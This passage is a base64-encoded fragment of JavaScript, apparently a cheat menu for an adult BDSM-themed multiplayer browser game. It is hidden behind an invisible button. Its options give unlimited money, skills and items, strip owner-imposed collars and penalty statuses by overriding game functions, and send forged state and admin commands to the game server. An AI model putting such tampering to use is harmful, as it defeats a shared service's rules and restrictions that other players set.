0ID0gIlB1cmNoYXNlIEV2ZXJ5dGhpbmciOwp2YXIgb3B0aW9uNiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb242LnZhbHVlID0gIm9wdDYiOwpvcHRpb242LnRleHQgPSAiUmVsZWFzZSBPd25lciBDb2xsYXIiOwp2YXIgb3B0aW9uNyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb243LnZhbHVlID0gIm9wdDciOwpvcHRpb243LnRleHQgPSAiKzEgTEFSUCBMZXZlbCI7CnZhciBvcHRpb244ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjgudmFsdWUgPSAib3B0OCI7Cm9wdGlvbjgudGV4dCA9ICJCZWNvbWUgRXNjYXBlZCBQYXRpZW50IjsKdmFyIG9wdGlvbjkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uOS52YWx1ZSA9ICJvcHQ5IjsKb3B0aW9uOS50ZXh0ID0gIkJlY29tZSBDbHViIFNsYXZlIjsKdmFyIG9wdGlvbjEwID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjEwLnZhbHVlID0gIm9wdDEwIjsKb3B0aW9uMTAudGV4dCA9ICJSZWxlYXNlIENsdWIgVGl0bGUiOwp2YXIgb3B0aW9uMTEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTEudmFsdWUgPSAib3B0MTEiOwpvcHRpb24xMS50ZXh0ID0gIlNldCBHR1RTIExldmVsIjsKdmFyIG9wdGlvbjEyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjEyLnZhbHVlID0gIm9wdDEyIjsKb3B0aW9uMTIudGV4dCA9ICJTZXQgRG9tL1N1YiBMZXZlbCI7CnZhciBvcHRpb24xMyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xMy52YWx1ZSA9ICJvcHQxMyI7Cm9wdGlvbjEzLnRleHQgPSAiU2V0IE5pY2tuYW1lIjsKdmFyIG9wdGlvbjE0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjE0LnZhbHVlID0gIm9wdDE0IjsKb3B0aW9uMTQudGV4dCA9ICJGb3JjZSBPcmdhc20iOwp2YXIgb3B0aW9uMTUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTUudmFsdWUgPSAib3B0MTUiOwpvcHRpb24xNS50ZXh0ID0gIkJDTSBEaXNjb3JkIjsKdmFyIG9wdGlvbjE2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjE2LnZhbHVlID0gIm9wdDE2IjsKb3B0aW9uMTYudGV4dCA9ICJGb3JjZSBMb2JieSI7CnZhciBvcHRpb24xNyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xNy52YWx1ZSA9ICJvcHQxNyI7Cm9wdGlvbjE3LnRleHQgPSAiTEFSUCBPcHRpb25zIjsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjEpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMik7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24zKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjQpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTIpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uNSk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb242KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjcpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uOCk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb245KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjEwKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjExKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjEzKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE0KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE2KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE3KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE1KTsKCgovLyBDcmVhdGUgYSBidXR0b24gdG8gc2hvdyB0aGUgZHJvcGRvd24gbWVudQp2YXIgZHJvcGRvd25CdXR0b24gPSBjcmVhdGVCdXR0b24oIlBlcnNvbmFsaXNhdGlvbiIsIGZ1bmN0aW9uKCkgewogIHNlbGVjdC5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKfSk7Ci8vIENTUyB0byBtYWtlIHRoZSBidXR0b24gaW52aXNpYmxlIGFuZCB0YWtlIG5vIHNwYWNlCmRyb3Bkb3duQnV0dG9uLnN0eWxlLm9wYWNpdHkgPSAiMCI7CmRyb3Bkb3duQnV0dG9uLnN0eWxlLnBvaW50ZXJFdmVudHMgPSAibm9uZSI7CmRyb3Bkb3duQnV0dG9uLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKZHJvcGRvd25CdXR0b24uc3R5bGUudG9wID0gIi05OTk5cHgiOwpkcm9wZG93bkJ1dHRvbi5zdHlsZS5sZWZ0ID0gIi05OTk5cHgiOwpzZWxlY3QuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbihldmVudCkgewogIGV2ZW50LnN0b3BQcm9wYWdhdGlvbigpOyAvLyBTdG9wIGV2ZW50IHByb3BhZ2F0aW9uCn0pOwoKc2VsZWN0LmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIHZhciBzZWxlY3RlZE9wdGlvbiA9IHNlbGVjdC5vcHRpb25zW3NlbGVjdC5zZWxlY3RlZEluZGV4XS52YWx1ZTsKICBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxIikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAxCiAgICBqYXZhc2NyaXB0OlBsYXllci5Nb25leSA9IDk5OTk5OTkKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGV2ZW50LnN0b3BQcm9wYWdhdGlvbigpOwogICAgZXZlbnQuc3RvcFByb3BhZ2F0aW9uKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQyIikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAyCiAgICBqYXZhc2NyaXB0OlBsYXllci5Nb25leSA9IHByb21wdCgiRW50ZXIgQ2FzaCBBbW91bnQiKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDMiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDMKICAgIGphdmFzY3JpcHQ6U2tpbGxDaGFuZ2UoIkluZmlsdHJhdGlvbiIsIDEwKTsKICAgIFNraWxsQ2hhbmdlKCJTZWxmQm9uZGFnZSIsIDEwKTsvL3NlbGYtdGllCiAgICBTa2lsbENoYW5nZSgiV2lsbHBvd2VyIiwgMTApOy8vUmVzaXN0IG9yZ2FzbXMKICAgIFNraWxsQ2hhbmdlKCJFdmFzaW9uIiwgMTApOy8vQmF0dGxlIHNraWxscwogICAgU2tpbGxDaGFuZ2UoIkJvbmRhZ2UiLCAxMCk7Ly9UaWUgb3RoZXJzCiAgICBTa2lsbENoYW5nZSgiRHJlc3NhZ2UiLCAxMCk7Ly9BQkRMCiAgICBTa2lsbENoYW5nZSgiTG9ja1BpY2tpbmciLCAxMCk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQ0IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiA0CiAgICBqYXZhc2NyaXB0OlJlcHV0YXRpb25DaGFuZ2UoIkdhbWluZyIsIDEwMCk7Ly9BcmNhZGUgYW5kIEtpbmt5RHVuZ2VvbgogICAgUmVwdXRhdGlvbkNoYW5nZSgiR2FtYmxpbmciLCAxMDApOy8vR2FtYmxpbmcgcm9vbQogICAgUmVwdXRhdGlvbkNoYW5nZSgiTEFSUCIsIDEwMCk7CiAgICBSZXB1dGF0aW9uQ2hhbmdlKCJNYWlkIiwgMTAwKTsvL0NhbiBiZSBhIE1haWQKICAgIFJlcHV0YXRpb25DaGFuZ2UoIkFCREwiLCAxMDApOwogICAgUmVwdXRhdGlvbkNoYW5nZSgiTnVyc2UiLCAxMDApOy8vQ2FuIGJlIGEgTnVyc2UKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDUiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDUKICAgIGphdmFzY3JpcHQ6U2VydmVyUGxheWVyU3luYwogICAgQXNzZXRGZW1hbGUzRENHLmZvckVhY2goZ3JvdXA9Pmdyb3VwLkFzc2V0LmZvckVhY2goaXRlbT0+SW52ZW50b3J5QWRkKFBsYXllciwgaXRlbS5OYW1lLCBncm91cC5Hcm91cCkpKTsKICAgIFNlcnZlclBsYXllckludmVudG9yeVN5bmMoKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDYiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDYKICAgIGphdmFzY3JpcHQ6SW52ZW50b3J5UmVtb3ZlKFBsYXllciwgIkl0ZW1OZWNrIik7CiAgICBDaGF0Um9vbUNoYXJhY3Rlckl0ZW1VcGRhdGUoUGxheWVyLCAiSXRlbU5lY2siKTsKICAgIExvZ0FkZCgiUmVsZWFzZWRDb2xsYXIiLCAiT3duZXJSdWxlIik7IAogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0NyIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gNwogICAgamF2YXNjcmlwdDphbGVydCgnU3RhcnQgYSBMQVJQIHNlc3Npb24gJiBzZWxlY3QgY2xhc3MgYmVmb3JlIHJ1bm5pbmcnKTsKICAgIEdhbWVMQVJQTGV2ZWxQcm9ncmVzcygxMDApIAogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0OCIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gOAogICAgamF2YXNjcmlwdDpMb2dBZGQoIkVzY2FwZWQiLCAiQXN5bHVtIiwgQ3VycmVudFRpbWUgKyA5OTk5OTk5OTkpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0OSIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gOQogICAgamF2YXNjcmlwdDpMb2dBZGQoIkNsdWJTbGF2ZSIsICJNYW5hZ2VtZW50IiwgQ3VycmVudFRpbWUgKyA5OTk5OTk5OTkpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTAiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDEwCiAgICBqYXZhc2NyaXB0OkxvZ0FkZCgiRXNjYXBlZCIsICJBc3lsdW0iLCBDdXJyZW50VGltZSk7CiAgICBMb2dBZGQoIkNsdWJTbGF2ZSIsICJNYW5hZ2VtZW50IiwgQ3VycmVudFRpbWUpOwogICAgTG9nQWRkKCJCbG9ja0NoYW5nZSIsICJSdWxlIiwgQ3VycmVudFRpbWUpOwogICAgTWFuYWdlbWVudElzQ2x1YlNsYXZlID0gZnVuY3Rpb24oKSB7CiAgICByZXR1cm4gZmFsc2UKICAgIH0KICAgIE1hbmFnZW1lbnRDbHViU2xhdmVEaWFsb2cgPSBmdW5jdGlvbihQbGF5ZXIpIHt9CiAgICBNYW5hZ2VtZW50RmluaXNoQ2x1YlNsYXZlKCkKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDExIikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAxMQogICAgamF2YXNjcmlwdDphbGVydCgnU3RhcnQgYSBHR1RTIHNlc3Npb24gYmVmb3JlIHJ1bm5pbmcsIHJlZnJlc2ggdG8gc2VlIGNoYW5nZXMnKTsKICAgIFBsYXllci5HYW1lLkdHVFMuTGV2ZWwgPSBwcm9tcHQoIkVudGVyIEdHVFMgTGV2ZWwgKDEtNikiKTs7CiAgICBTZXJ2ZXJBY2NvdW50VXBkYXRlLlF1ZXVlRGF0YSh7CiAgICBHYW1lOiBQbGF5ZXIuR2FtZQogICAgfSk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogICAgCiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTIiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDEyCiAgICBqYXZhc2NyaXB0OkRpYWxvZ1NldFJlcHV0YXRpb24oIkRvbWluYW50IiwgcHJvbXB0KCJFbnRlciBTdWIvRG9tIFJlcCAoLTEwMCB0byAxMDApIikpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxMyIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMTMKICAgIGphdmFzY3JpcHQ6bmFtZSA9IHByb21wdCgiRW50ZXIgTmlja25hbWUiKTs7CiAgICBQbGF5ZXIuTmlja25hbWUgPSBuYW1lOwogICAgU2VydmVyQWNjb3VudFVwZGF0ZS5RdWV1ZURhdGEoeyBOaWNrbmFtZTogbmFtZSB9LCB0cnVlKTsgICAKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7ICAKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxNCIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMTQKICAgIGphdmFzY3JpcHQ6QWN0aXZpdHlTZXRBcm91c2FsKFBsYXllciwgMSk7CiAgICBBY3Rpdml0eU9yZ2FzbVByZXBhcmUoUGxheWVyLCB0cnVlKTsKICAgIEFjdGl2aXR5T3JnYXNtR2FtZVJlc2lzdENvdW50ID0gMTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTUiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDE1CiAgICBqYXZhc2NyaXB0OndpbmRvdy5vcGVuKCdodHRwczovL2Rpc2NvcmQuZ2cvdjNKQmp5UzRteCcsICdfYmxhbmsnKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfWVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTYiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDE2CiAgICBqYXZhc2NyaXB0OihmdW5jdGlvbigpIHtsZXQgaW5wdXQgPSBwcm9tcHQoIk1hbGUgLyBGZW1hbGUgLyBNaXhlZCIpOwogICAgbGV0IHBsYWNlaG9sZGVyOwogICAgCiAgICBpZiAoaW5wdXQudG9Mb3dlckNhc2UoKSA9PT0gIm1hbGUiKSB7CiAgICAgIHBsYWNlaG9sZGVyID0gIk0iOwogICAgfSBlbHNlIGlmIChpbnB1dC50b0xvd2VyQ2FzZSgpID09PSAibWl4ZWQiKSB7CiAgICAgIHBsYWNlaG9sZGVyID0gIlgiOwogICAgfSBlbHNlIHsKICAgICAgcGxhY2Vob2xkZXIgPSAiIjsKICAgIH0gIAoKICAgIAogICAgQ2hhdFJvb21TdGFydChwbGFjZWhvbGRlciwgIiIsIG51bGwsIG51bGwsICJJbnRyb2R1Y3Rpb24iLCBCYWNrZ3JvdW5kc1RhZ0xpc3QpOwogIH0pKCk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDE3IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAxNwogICAgamF2YXNjcmlwdDooZnVuY3Rpb24oKSB7bGV0IGlucHV0ID0gcHJvbXB0KCJTdGFydCBhIExBUlAgUm9vbSBhcyBBZG1pbiBGaXJzdFxuU3RhcnQgLyBTa2lwIC8gTWl4ZWQgLyBTaHVmZmxlIC8gVGVhbSAvIFdpbiAoY29sb3IpIikudG9Mb3dlckNhc2UoKTsKCiAgICBpZiAoaW5wdXQgPT09ICJzdGFydCIpIHsKICAgICAgU2VydmVyU2VuZCgiQ2hhdFJvb21HYW1lIiwgeyBHYW1lUHJvZ3Jlc3M6ICJTdGFydCIgfSk7CiAgICB9IGVsc2UgaWYgKGlucHV0ID09PSAic2tpcCIpIHsKICAgICAgU2VydmVyU2VuZCgiQ2hhdFJvb21HYW1lIiwgeyBHYW1lUHJvZ3Jlc3M6ICJTa2lwIiB9KTsKICAgIH0gZWxzZSBpZiAoaW5wdXQgPT09ICJzaHVmZmxlIikgewogICAgICBTZXJ2ZXJTZW5kKCJDaGF0Um9vbUFkbWluIiwgeyBNZW1iZXJOdW1iZXI6IENoYXRSb29tQ2hhcmFjdGVyWzFdLk1lbWJlck51bWJlciwgQWN0aW9uOiAiU2h1ZmZsZSIgfSk7CiAgICB9IGVsc2UgaWYgKGlucHV0ID09PSAidGVhbSIpIHsKICAgICAgY29uc3QgRGljdGlvbmFyeSA9IG5ldyBEaWN0aW9uYXJ5QnVpbGRlcigpCiAgICAgIC5zb3VyY2VDaGFyYWN0ZXIoUGxheWVyKQogICAgICAuYnVpbGQoKTsKICAgIFNlcnZlclNlbmQoIkNoYXRSb29tQ2hhdCIsIHsgQ29udGVudDogIkxBUlBDaGFuZ2VUZWFtQ2xhc3MiLCBUeXBlOiAiQWN0aW9uIiwgRGljdGlvbmFyeTogRGljdGlvbmFyeSB9KTsKICB9IGVsc2UgaWYgKGlucHV0LnN0YXJ0c1dpdGgoIndpbiIpKSB7CiAgICAgIGxldCBjb2xvciA9IGlucHV0LnNsaWNlKDQpLnRyaW0oKTsKICAgICAgY29sb3IgPSBjb2xvci5jaGFyQXQoMCkudG9VcHBlckNhc2UoKSArIGNvbG9yLnNsaWNlKDEpOwogICAgICBHYW1lTEFSUEFkZENoYXRMb2coIkVuZEdhbWUiLCBQbGF5ZXIsIFBsYXllciwgT25saW5lR2FtZURpY3Rpb25hcnlUZXh0KCJUZWFtIiArIGNvbG9yKSwgMCwgMCwgIiMwMDAwQjAiKTsKICAgIH0KICB9KSgpOwoKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfQoKICAvLyBIaWRlIHRoZSBkcm9wZG93biBtZW51CiAgc2VsZWN0LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7Cn0pOwoKLy9FbmQgb2YgREQgbWVudV9fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgovLyBBZGQgaGVhZGVyLCBidXR0b25zLCBhbmQgc2VwYXJhdG9yIHRvIGNvbnRleHQgbWVudQoKZnVuY3Rpb24gdXBkYXRlQ29udGV4dE1lbnUoKSB7CiAgd2hpbGUgKGNvbnRleHRNZW51LmZpcnN0Q2hpbGQpIHsKICAgIGNvbnRleHRNZW51LnJlbW92ZUNoaWxkKGNvbnRleHRNZW51LmZpcnN0Q2hpbGQpOwogIH0KICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChoZWFkZXIpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGNyZWF0ZVNlcGFyYXRvcigpKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24xKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24yKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24zKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b240KTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b241KTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b242KTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b243KTsKICBpZiAodmlzYikgewogICAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uOCk7CiAgfSBlbHNlIHsKICAgIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjkpOwogIH0KICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b24xMCk7CiAgLy8gQWRkIHRoZSBkcm9wZG93biBtZW51IHRvIHRoZSBjb250ZXh0IG1lbnUKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChjcmVhdGVTZXBhcmF0b3IoKSk7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoZHJvcGRvd25CdXR0b24pOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKHNlbGVjdCk7CiAgCn0KCnVwZGF0ZUNvbnRleHRNZW51KCk7CgovLyBFdmVudCBsaXN0ZW5lciB0byB1cGRhdGUgdGhlIG1lbnUgd2hlbiBvcGVuZWQKY29udGV4dE1lbnUuYWRkRXZlbnRMaXN0ZW5lcignY29udGV4dG1lbnUnLCBmdW5jdGlvbigpIHsKICB1cGRhdGVDb250ZXh0TWVudSgpOwp9KTsKCmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoY29udGV4dE1lbnUpOwoKICAgIAp9KTsKCi8vIEZ1bmN0aW9uIHRvIGhpZGUgdGhlIGN1c3RvbSBjb250ZXh0IG1lbnUKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbigpIHsKICAgIGlmIChjb250ZXh0TWVudU9wZW4pIHsKICAgICAgICB2YXIgY29udGV4dE1lbnUgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCJkaXZbc3R5bGUqPSdmaXhlZCddIik7CiAgICAgICAgaWYgKGNvbnRleHRNZW51KSB7CiAgICAgICAgICAgIGNvbnRleHRNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgICAgIENoYXRSb29tQ2xpY2tDaGFyYWN0ZXIoUGxheWVyKTsKICAgICAgICAgICAgRGlhbG9nTGVhdmUoKTsKICAgICAgICB9CiAgICAgICAgY29udGV4dE1lbnVPcGVuID0gZmFsc2U7CiAgICB9Cn0pOwoKCi8vU3RhcnQgb2Yga2V5Ym9hcmQgc2hvcnRjdXRzX19fX19fX19fX19fX19fX19fXwoKbGV0IGJhY2t0aWNrUHJlc3NlZCA9IGZhbHNlOwoKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgLy8gY2hlY2sgaWYgdGhlIGJhY2t0aWNrIChgKSBrZXkgaXMgcHJlc3NlZAogIGlmIChldmVudC5rZXkgPT09ICJgIiAmJiAhYmFja3RpY2tQcmVzc2VkKSB7CiAgICBiYWNrdGlja1ByZXNzZWQgPSB0cnVlOwogIH0KICAvLyBjaGVjayBpZiB0aGUgYmFja3RpY2sgKGApIGtleSBhbmQgY29tbWEgKCwpIGtleSBhcmUgcHJlc3NlZAogIGVsc2UgaWYgKGV2ZW50LmtleSA9PT0gIiwiICYmIGJhY2t0aWNrUHJlc3NlZCkgewogICAgLy8gc2hvdyBhbGVydCBmb3IgbW92aW5nIGxlZnQKICAgIFNlcnZlclNlbmQoIkNoYXRSb29tQWRtaW4iLCB7CiAgICAgIE1lbWJlck51bWJlcjogUGxheWVyLk1lbWJlck51bWJlciwKICAgICAgQWN0aW9uOiAiTW92ZUxlZnQiLAogICAgfSk7ICAgIGJhY2t0aWNrUHJlc3NlZCA9IGZhbHNlOwogIH0KICAvLyBjaGVjayBpZiB0aGUgYmFja3RpY2sgKGApIGtleSBhbmQgcGVyaW9kICguKSBrZXkgYXJlIHByZXNzZWQKICBlbHNlIGlmIChldmVudC5rZXkgPT09ICIuIiAmJiBiYWNrdGlja1ByZXNzZWQpIHsKICAgIC8vIHNob3cgYWxlcnQgZm9yIG1vdmluZyByaWdodAogICAgU2VydmVyU2VuZCgiQ2hhdFJvb21BZG1pbiIsIHsKICAgICAgTWVtYmVyTnVtYmVyOiBQbGF5ZXIuTWVtYmVyTnVtYmVyLAogICAgICBBY3Rpb246ICJNb3ZlUmlnaHQiLAogICAgfSk7ICAgIGJhY2t0aWNrUHJlc3NlZCA9IGZhbHNlOwogIH0KfSk7Cgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXl1cCIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgLy8gY2hlY2sgaWYgdGhlIGJhY2t0aWNrIChgKSBrZXkgaXMgcmVsZWFzZWQKICBpZiAoZXZlbnQua2V5ID09PSAiYCIpIHsKICAgIGJhY2t0aWNrUHJlc3NlZCA9IGZhbHNlOwogIH0KfSk7CgoKLy9FTkQgT0YgQ09OVEVYVCBNRU5VIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmZ1bmN0aW9uIHNob3dUb2FzdHNjcGcoKSB7CiAgICAvLyBDcmVhdGUgdGhlIHRvYXN0IGNvbnRhaW5lcgogICAgdmFyIHRvYXN0Q29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3R0b20gPSAiNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnJpZ2h0ID0gIjVweCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAid2hpdGUiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuY29sb3IgPSAiIzE0MTQxNCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5wYWRkaW5nID0gIjVweCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXIgPSAiMnB4IHNvbGlkICM0Q0FGNTAiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyUmFkaXVzID0gIjVweCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3hTaGFkb3cgPSAiMnB4IDJweCAxMHB4IHJnYmEoMCwgMCwgMCwgMC41KSI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuekluZGV4ID0gIjk5OSI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS50cmFuc2l0aW9uID0gIm9wYWNpdHkgMC41cyBlYXNlLWluLW91dCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKICAgIHZhciBzdGF0dXNCYXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjEwMCUiOwpzdGF0dXNCYXIuc3R5bGUuaGVpZ2h0ID0gIjNweCI7CnN0YXR1c0Jhci5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiYmxhY2siOwpzdGF0dXNCYXIuc3R5bGUucG9zaXRpb24gPSAiYWJzb2x1dGUiOwpzdGF0dXNCYXIuc3R5bGUuYm90dG9tID0gIjAiOwpzdGF0dXNCYXIuc3R5bGUubGVmdCA9ICIwIjsKc3RhdHVzQmF